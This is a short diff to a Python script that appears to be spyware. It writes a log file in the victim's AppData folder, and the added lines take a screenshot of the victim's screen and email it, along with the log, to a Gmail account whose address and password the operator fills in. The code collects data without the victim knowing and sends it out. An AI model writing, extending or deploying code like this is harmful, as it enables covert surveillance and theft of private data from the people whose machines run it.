@@ -6,11 +6,14 @@ from email.MIMEText import MIMEText
 from email import Encoders
 import os
 import time
+from PIL import ImageGrab
 
 home = os.path.expanduser("~") 
 
 open(home + "//Appdata//Roaming//" + 'log.txt', 'a')
 file_log = home + "//Appdata//Roaming//" + 'log.txt'
+im = ImageGrab.grab()
+im.save(home + "//Appdata//Roaming//tmp.png")
 gmail_user = "" #enter receiving gmail address here
 gmail_pwd = "" #enter gmail address password here
 
@@ -50,6 +53,10 @@ mail("",#enter gmail receiver email address here
    "SUBJECT HERE",
    "BODY HERE",
     home + "//Appdata//Roaming//" + 'log.txt')
+mail("",#enter gmail receiver email address here
+   "SUBJECT HERE",
+   "BODY HERE",
+    home + "//Appdata//Roaming//" + 'tmp.png')
 
 
 
